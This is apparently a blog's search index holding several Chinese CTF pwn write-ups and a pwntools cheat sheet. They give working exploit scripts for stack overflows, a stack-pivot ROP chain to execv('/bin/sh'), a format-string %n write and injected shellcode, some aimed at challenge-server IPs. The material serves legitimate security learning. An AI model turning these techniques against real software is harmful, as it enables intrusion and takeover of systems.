<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>guess_num</title>
      <link href="/2022/12/28/guess-num/"/>
      <url>/2022/12/28/guess-num/</url>
      
        <content type="html"><![CDATA[<h2 id="guess-num-wp"><a href="#guess-num-wp" class="headerlink" title="guess_num wp"></a>guess_num wp</h2><p>为什么写这题呢？感觉这题很有代表性（学到的东西挺多），以后很多的问题可以提前解决，所以写一篇博客记录一下。<br>先checksec一下：<br><img src="/images/guess_num/1.png"><br>吓死本菜鸡了！竟然三个保护机制全开了！<br>我们拖入IDA查看：<br><img src="/images/guess_num/2.png"><br>代码还有点小长……<del>当场决定放弃</del>咳咳，这题着实吓到我了，看一下有没有威胁函数，发现gets函数可以无限输入<br>硬着头皮查看每个函数，发现：<br><img src="/images/guess_num/03.png"><br>sub_C3E函数里可以直接抓取flag，回去看一眼这个函数的位置，在最底部，中间有个循环判断而且有个exit（0）想要运行sub_C3E必须要绕过他（从判断脱离出来）<br>但我又不知道srand()函数和rand()函数有什么作用……去网上查一查发现这两个函数要配合使用srand()函数为rand()函数初始化，srand()里的参数不同对应rand()的产生的随机数也不同<br>但只要srand()里的数是固定的，那么rand产生的随机数也是固定的。<br>那么就要自己写个程序：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;stdlib.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">int</span> key<span class="token punctuation">,</span>i<span class="token punctuation">;</span><span class="token function">srand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span><span class="token number">10</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>key<span class="token operator">=</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">6</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d\n"</span><span class="token punctuation">,</span>key<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行去查看它产生的随机数，这里我们选择0<del>（方便）</del><br>又涉及到一个冷知识同一串程序在linux和windows中产生的随机数是不一样的！<del>好吧，摊牌了我看了wp，哈哈</del>咳咳，<br>结果把cpp文件拖到虚拟机里运行又出了问题……<br><img src="/images/guess_num/04.png"><br>这里要改一下进行以下操作：</p><pre class="line-numbers language-none"><code class="language-none">1.  cc c.cpp（原来的名字） -o 1c（想改的文件名）2.  .&#x2F;1c  #运行<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>我原来的文件名是c.cpp经过上述操作改成了1c（就可以用了，我也不知道为什么）<br>运行一下：<br><img src="/images/guess_num/5.png"><br>把数据记下来。<br>上exp：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>io<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">"223.112.5.156"</span><span class="token punctuation">,</span><span class="token number">60001</span><span class="token punctuation">)</span>payload<span class="token operator">=</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">32</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Your name:"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>rand<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'2'</span><span class="token punctuation">,</span><span class="token string">'5'</span><span class="token punctuation">,</span><span class="token string">'4'</span><span class="token punctuation">,</span><span class="token string">'2'</span><span class="token punctuation">,</span><span class="token string">'6'</span><span class="token punctuation">,</span><span class="token string">'2'</span><span class="token punctuation">,</span><span class="token string">'5'</span><span class="token punctuation">,</span><span class="token string">'1'</span><span class="token punctuation">,</span><span class="token string">'4'</span><span class="token punctuation">,</span><span class="token string">'2'</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token builtin">int</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Please input your guess number:"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>rand<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>获得flag：<br><img src="/images/guess_num/6.png"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>栈转移原理与通用garget的使用</title>
      <link href="/2022/12/28/%E6%A0%88%E8%BD%AC%E7%A7%BB%E5%8E%9F%E7%90%86%E4%B8%8E%E9%80%9A%E7%94%A8rop%E7%9A%84%E4%BD%BF%E7%94%A8/"/>
      <url>/2022/12/28/%E6%A0%88%E8%BD%AC%E7%A7%BB%E5%8E%9F%E7%90%86%E4%B8%8E%E9%80%9A%E7%94%A8rop%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="栈转移原理与通用rop的使用"><a href="#栈转移原理与通用rop的使用" class="headerlink" title="栈转移原理与通用rop的使用"></a>栈转移原理与通用rop的使用</h1><p>此题下载链接：<br><a href="/download/advanced">点击下载</a><br>这里我们通过一题pwn题边解边说：<br><img src="/images/%E6%A0%88%E8%BD%AC%E7%A7%BB%E5%8E%9F%E7%90%86%E4%B8%8E%E9%80%9A%E7%94%A8rop%E7%9A%84%E4%BD%BF%E7%94%A8/1.png"><br>可以看到，这题讲解示范没有开任何保护。<br>拖入ida查看：<br><img src="/images/%E6%A0%88%E8%BD%AC%E7%A7%BB%E5%8E%9F%E7%90%86%E4%B8%8E%E9%80%9A%E7%94%A8rop%E7%9A%84%E4%BD%BF%E7%94%A8/2.png"><br>虽然打印出来了execv的地址和system的地址，但不知道为什么和~~ 实际差挺多的  ~~……如下：<br><img src="/images/%E6%A0%88%E8%BD%AC%E7%A7%BB%E5%8E%9F%E7%90%86%E4%B8%8E%E9%80%9A%E7%94%A8rop%E7%9A%84%E4%BD%BF%E7%94%A8/3.png"><br>查看vul函数发现有溢出点但是字节有限只能溢出24个字节，而此题没有现成的system或execv函数可用，直接溢出并不现实<br><img src="/images/%E6%A0%88%E8%BD%AC%E7%A7%BB%E5%8E%9F%E7%90%86%E4%B8%8E%E9%80%9A%E7%94%A8rop%E7%9A%84%E4%BD%BF%E7%94%A8/4.png"></p><h3 id="栈转移原理"><a href="#栈转移原理" class="headerlink" title="栈转移原理"></a>栈转移原理</h3><p>现在介绍一个新的方法：<strong>栈转移</strong><br>当碰到这种题目时，因为溢出字节不够，要转移到别的栈段上运行已准备好的rop<br>栈是由rbp和rsp决定的，尤其是后者rsp在哪，栈就在哪。因此，我们只需要想办法把rsp指针转移到我们需要的地方即可。而想要改变rsp的值，可以先通过改变rbp的值，再把rbp的值传递给rsp就可以达到栈转移到目的。<br>实际方法用leave ret指令可以做到<br>我们知道leave指令相当于</p><pre class="line-numbers language-none"><code class="language-none">move rsp, rbppop  rbp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>ret指令相当于：</p><pre class="line-numbers language-none"><code class="language-none">pop rip<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>因此将rbp的值先覆盖成目标地址，利用函数自带的leave指令先将rbp控制，接下另一段leave ret的garget的地址就可以实现rsp的控制实现栈转移，至于转移后rbp的值并不重要<br>leave;ret;地址：<br><img src="/images/%E6%A0%88%E8%BD%AC%E7%A7%BB%E5%8E%9F%E7%90%86%E4%B8%8E%E9%80%9A%E7%94%A8rop%E7%9A%84%E4%BD%BF%E7%94%A8/5.png"></p><h3 id="通用garget原理"><a href="#通用garget原理" class="headerlink" title="通用garget原理"></a>通用garget原理</h3><p>已经把栈转移到了grobe_buf去了，接下来设置该区域的rop链，我们用通用garget<br>我们点开_libc_csu_init这个函数<br><img src="/images/%E6%A0%88%E8%BD%AC%E7%A7%BB%E5%8E%9F%E7%90%86%E4%B8%8E%E9%80%9A%E7%94%A8rop%E7%9A%84%E4%BD%BF%E7%94%A8/7.png"><br>可以发现这里的garget是不是很齐全，只要调用了这里几乎哪里都能call，这里分为两个garget分别记下地址<br>这里说一下怎么查看execv函数got表地址：<br><img src="/images/%E6%A0%88%E8%BD%AC%E7%A7%BB%E5%8E%9F%E7%90%86%E4%B8%8E%E9%80%9A%E7%94%A8rop%E7%9A%84%E4%BD%BF%E7%94%A8/9.png"><br><img src="/images/%E6%A0%88%E8%BD%AC%E7%A7%BB%E5%8E%9F%E7%90%86%E4%B8%8E%E9%80%9A%E7%94%A8rop%E7%9A%84%E4%BD%BF%E7%94%A8/10.png"><br>接下来上exp：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>io<span class="token operator">=</span>process<span class="token punctuation">(</span><span class="token string">'./advanced'</span><span class="token punctuation">)</span>payload1<span class="token operator">=</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">80</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x404080</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x4011fb</span><span class="token punctuation">)</span><span class="token comment">#leave ret的地址</span>payload2<span class="token operator">=</span><span class="token string">b'/bin/sh\x00'</span><span class="token comment">#将/bin/sh\x00输入grobe_buf中</span>payload2<span class="token operator">+=</span>p64<span class="token punctuation">(</span><span class="token number">0x40133a</span><span class="token punctuation">)</span><span class="token comment">#通用garget pop部分</span>payload2<span class="token operator">+=</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token comment">#rbx</span>payload2<span class="token operator">+=</span>p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment">#rbp</span>payload2<span class="token operator">+=</span>p64<span class="token punctuation">(</span><span class="token number">0x404080</span><span class="token punctuation">)</span><span class="token comment">#将/bin/sh的地址给r12，r12后会给rdi</span>payload2<span class="token operator">+=</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token comment">#r13</span>payload2<span class="token operator">+=</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token comment">#r14 这两个值看调用函数原型的要求来定</span>payload2<span class="token operator">+=</span>p64<span class="token punctuation">(</span><span class="token number">0x403ff8</span><span class="token punctuation">)</span><span class="token comment">#execv函数在got表的真实地址</span>payload2<span class="token operator">+=</span>p64<span class="token punctuation">(</span><span class="token number">0x401320</span><span class="token punctuation">)</span><span class="token comment">#通用garget call部分</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'global:'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'input:'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload1<span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>结束战斗：<del>（由于是本地做题没有flag）</del><br><img src="/images/%E6%A0%88%E8%BD%AC%E7%A7%BB%E5%8E%9F%E7%90%86%E4%B8%8E%E9%80%9A%E7%94%A8rop%E7%9A%84%E4%BD%BF%E7%94%A8/11.png"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>CGfsb_wp</title>
      <link href="/2022/12/27/CGfsb-wp/"/>
      <url>/2022/12/27/CGfsb-wp/</url>
      
        <content type="html"><![CDATA[<h2 id="CGfsb"><a href="#CGfsb" class="headerlink" title="CGfsb"></a>CGfsb</h2><p>先将其在终端checksec一下：<br><img src="/images/CGfsb-wp/1.png"><br>32位程序，开了NX(堆栈不可执行)以及CANNARY(栈保护)，但这题开cannary真没感觉有什么用，又不是用栈溢出，奇怪……<br>拖入IDA查看代码<br><img src="/images/CGfsb-wp/2.png"><br>有两个输入点，这里重点看这个printf(s);这个是C语言学习中没涉及到的，等等会细说<br>观察有个system(“cat flag”);可以直接抓取flag于是思路清晰只要然pwnme&#x3D;8就可以了，双击pwnme发现他存储在bss段，我们要如何才能用栈段的数据写到它那去呢？<br>这里就涉及到一个漏洞：格式化字符串漏洞<br>一般上格式是</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token function">printf</span><span class="token punctuation">(</span>“<span class="token operator">%</span>s”，s<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>但变成了</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token function">printf</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">%d - 十进制 - 输出十进制整数%s - 字符串 - 从内存中读取字符串%x - 十六进制 - 输出十六进制数%c - 字符 - 输出字符%p - 指针 - 指针地址%n - 到目前为止所写的字符数<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>特别注意%n，它的功能是将%n之前打印出来的字符个数，赋值给一个变量比如：<br><img src="/images/CGfsb-wp/3.png"><br>a的值被改变了<br>也就是说他在某种特定环境下可以作为一个scanf来使用（不懂这个打死都别想做出来）<br>我们需要将pwnme的地址输入到s的空间去，在合适的位置上加一个%n，使其与我们输入的地址对应，从而造成漏洞利用<br>所以接下来的问题变成了如何让他们对应起来<br>对其运行输入<br><img src="/images/CGfsb-wp/4.png"><br>发现偏移量为10<br>上exp</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>io<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">"61.147.171.105"</span><span class="token punctuation">,</span><span class="token number">56143</span><span class="token punctuation">)</span>pwnme<span class="token operator">=</span>p32<span class="token punctuation">(</span><span class="token number">0x0804A068</span><span class="token punctuation">)</span>payload<span class="token operator">=</span>pwnme<span class="token operator">+</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">4</span><span class="token operator">+</span><span class="token string">b'%10$n'</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"name:\n"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"zjh"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"please:\n"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>get shell!拿到flag<br><img src="/images/CGfsb-wp/5.png"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>repeater_wp</title>
      <link href="/2022/12/26/repeater-wp/"/>
      <url>/2022/12/26/repeater-wp/</url>
      
        <content type="html"><![CDATA[<h2 id="repeater"><a href="#repeater" class="headerlink" title="repeater"></a>repeater</h2><p>遇到的第一题开PIE保护机制的pwn题，写一篇记录一下<br>PIE保护机制就是使程序的基地址随机化让我们无法进行shellcode的注入、rop链的搭建等，因此需要解题的第一件事就是找出程序的基地址，目标明确！<br>首先先将其checksec一下：<br><img src="/images/repeater-wp/1.png"><br>发现此题只开了PIE保护，NX保护机制没开可以实现shellcode注入，因此目标：找出基地址，并实现shellcode注入获取shell。<br>将其拖入IDA进行查看：<br><img src="/images/repeater-wp/2.png"><br>实际地址&#x3D;基地址+偏移地址，想要实际地址要知道基地址和偏移地址。在图中告诉我们s的偏移地址为rbp-30h，v5的偏移地址为rbp-10h二者相差20h（32字节），<br>read函数以s的地址为底可以溢出64个字节可以覆盖至返回地址！<br>对于sub_982（byte_202040，48ull）函数的功能单看应该是看不出来的但我们在终端中可以测试这个函数的功能<br><img src="/images/repeater-wp/3.png"><br>我们发现这个函数是进行输入名字的，通过浅浅分析它把名字放到了202040这个地址，可以将shellcode注入这里。<br>main函数偏移地址可以直接查看：<br><img src="/images/repeater-wp/4.png"><br>所以整体思路用exp来表示：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>io<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">'61.147.171.105'</span><span class="token punctuation">,</span><span class="token number">64894</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>arch <span class="token operator">=</span> <span class="token string">'amd64'</span>shellcode<span class="token operator">=</span>asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>sh<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'name :'</span><span class="token punctuation">,</span>shellcode<span class="token punctuation">)</span>payload<span class="token operator">=</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">32</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">3281697</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"input :"</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"you :\n0x"</span><span class="token punctuation">)</span>main_addr<span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token string">'12'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>b_addr<span class="token operator">=</span>main_addr<span class="token operator">-</span><span class="token number">0xa33</span>shellcode_addr<span class="token operator">=</span>b_addr<span class="token operator">+</span><span class="token number">0x202040</span>payload2<span class="token operator">=</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x20</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x1</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">16</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>shellcode_addr<span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"input :"</span><span class="token punctuation">,</span>payload2<span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>获得shell。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>hello_pwn</title>
      <link href="/2022/12/25/hello-pwn/"/>
      <url>/2022/12/25/hello-pwn/</url>
      
        <content type="html"><![CDATA[<h2 id="hello-pwn"><a href="#hello-pwn" class="headerlink" title="hello_pwn"></a>hello_pwn</h2><p>先将其在终端中checksec下：<br><img src="/images/hello_pwn/1.png"><br>只开了NX保护，推断是个栈溢出问题。<br>拖进IDA查看：<br><img src="/images/hello_pwn/2.png"><br>发现有个read函数可溢出16个字节。<br>对其中函数分析发现sub_400686()函数可直接调用system函数抓取flag：<br><img src="/images/hello_pwn/3.png"><br>目标明确！要调用sub_400686()，于是我们回头查看条件<br><img src="/images/hello_pwn/2.png"><br>发现只需让dword_60106C &#x3D;&#x3D; 1853186401即可<br>查看栈帧：<br><img src="/images/hello_pwn/4.png"><br>发现非常凑巧的unk_601068离dword_60106c只差4个字节栈，溢出完全够用<br>上exp</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>io<span class="token operator">=</span>process<span class="token punctuation">(</span><span class="token string">'./hello_pwn'</span><span class="token punctuation">)</span>payload<span class="token operator">=</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">4</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">1853186401</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'bof'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/images/hello_pwn/5.png"><br>成功获得shell，由于是在本地下载做的所以没有flag的文件，但在远程会有这个文件，也算是成功了</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>浅尝pwn题：pwnstack</title>
      <link href="/2022/12/24/%E6%B5%85%E5%B0%9Dpwn%E9%A2%98%EF%BC%9Apwnstack/"/>
      <url>/2022/12/24/%E6%B5%85%E5%B0%9Dpwn%E9%A2%98%EF%BC%9Apwnstack/</url>
      
        <content type="html"><![CDATA[<h2 id="pwnstack-wp"><a href="#pwnstack-wp" class="headerlink" title="pwnstack wp"></a>pwnstack wp</h2><p>这题pwn是我看wp写出来的，一个晚上的琢磨感觉网上的wp还是不够简洁，于是乎我自己来总结一下：<br>首先从网站上下载压缩包解压后放至自己虚拟机的文件夹中；<br>发现它是个64位二进制文件：<br><img src="/images/%E6%B5%85%E5%B0%9Dpwn%E9%A2%98%EF%BC%9Apwnstack/1.png"><br>对其进行checksec下如下图：<br><img src="/images/%E6%B5%85%E5%B0%9Dpwn%E9%A2%98%EF%BC%9Apwnstack/2.png"><br>发现只有NX保护打开。<br>在物理机上将它拖进IDA中分析：<br><img src="/images/%E6%B5%85%E5%B0%9Dpwn%E9%A2%98%EF%BC%9Apwnstack/3.png"><br>对其中的函数双击点进去，发现vul函数中有read函数可读取177个字节，而我们定义的buf只有160个字节，很明显是个栈溢出题目。<br><img src="/images/%E6%B5%85%E5%B0%9Dpwn%E9%A2%98%EF%BC%9Apwnstack/4.png"><br>然后我们在这列中找到了后门函数：backdoor<br><img src="/images/%E6%B5%85%E5%B0%9Dpwn%E9%A2%98%EF%BC%9Apwnstack/5.png"><br>进去看发现它可以直接调用&#x2F;bin&#x2F;sh获得shell：<br><img src="/images/%E6%B5%85%E5%B0%9Dpwn%E9%A2%98%EF%BC%9Apwnstack/6.png"><br>接下来就是编写脚本了，因为要覆盖到返回地址只要将buf区填满和rbp指针覆盖共需要168个字节于是我们填充168个a，后面返回地址则覆盖为backdoor的地址即可</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span> io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./pwn2'</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">168</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x400762</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>获取shell</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>pwntools的基本语法</title>
      <link href="/2022/12/24/pwntools%E7%9A%84%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95/"/>
      <url>/2022/12/24/pwntools%E7%9A%84%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<p>from pwn import *</p><h2 id="连接远程题目"><a href="#连接远程题目" class="headerlink" title="连接远程题目"></a>连接远程题目</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python">r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span><span class="token number">809</span><span class="token punctuation">)</span> <span class="token comment">#usage:remote('host',port)</span><span class="token comment">#exp code</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">#取得shell后可将commant传到terminal上</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="连接本地程序"><a href="#连接本地程序" class="headerlink" title="连接本地程序"></a>连接本地程序</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python">p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./demo'</span><span class="token punctuation">)</span> <span class="token comment">#usage:process('binary',env)</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span><span class="token string">'splitw'</span><span class="token punctuation">,</span><span class="token string">'-h'</span><span class="token punctuation">]</span> <span class="token comment">#在tmux下可以切出视窗跑gdb</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>p<span class="token punctuation">)</span> <span class="token comment">#attach到gdb</span><span class="token comment">#exp code</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="recv"><a href="#recv" class="headerlink" title="recv"></a>recv</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python">r<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">#接收一个字节</span>r<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">#接受一行</span>r<span class="token punctuation">.</span>recvlines<span class="token punctuation">(</span>num<span class="token punctuation">)</span> <span class="token comment">#接收(num)行</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token comment">#一直接收直到碰到(str)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="send"><a href="#send" class="headerlink" title="send"></a>send</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python">r<span class="token punctuation">.</span>sned<span class="token punctuation">(</span>payload<span class="token punctuation">)</span> <span class="token comment">#发送payload</span>r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span> <span class="token comment">#再最后面加上空字符</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="pack-amp-unpack"><a href="#pack-amp-unpack" class="headerlink" title="pack&amp;unpack"></a>pack&amp;unpack</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python">p32<span class="token punctuation">(</span><span class="token number">0xdeadbeef</span><span class="token punctuation">)</span> <span class="token comment">#b'\xef\xbe\xad\xde'</span>p64<span class="token punctuation">(</span><span class="token number">0xdeadbeef</span><span class="token punctuation">)</span> <span class="token comment">#b'\xef\xbe\xad\xde\x00\x00\x00\x00'</span><span class="token builtin">hex</span><span class="token punctuation">(</span>u32<span class="token punctuation">(</span><span class="token string">'\xef\xbe\xad\xde'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">#'0xdeadbeef'</span><span class="token builtin">hex</span><span class="token punctuation">(</span>u64<span class="token punctuation">(</span><span class="token string">'\xef\xbe\xad\xde\x00\x00\x00\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">#'0xdeadbeef'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="payload用flat-连接"><a href="#payload用flat-连接" class="headerlink" title="payload用flat()连接"></a>payload用flat()连接</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python">flat<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'A'</span><span class="token operator">*</span> <span class="token number">5</span><span class="token punctuation">,</span><span class="token number">0xdeadbeef</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token comment">#b'AAAAA\xef\xbe\xad\xde'</span><span class="token comment">#在flat()函数中，不用使用b'A'的形式</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="context-架构"><a href="#context-架构" class="headerlink" title="context(架构)"></a>context(架构)</h2><pre class="line-numbers language-python" 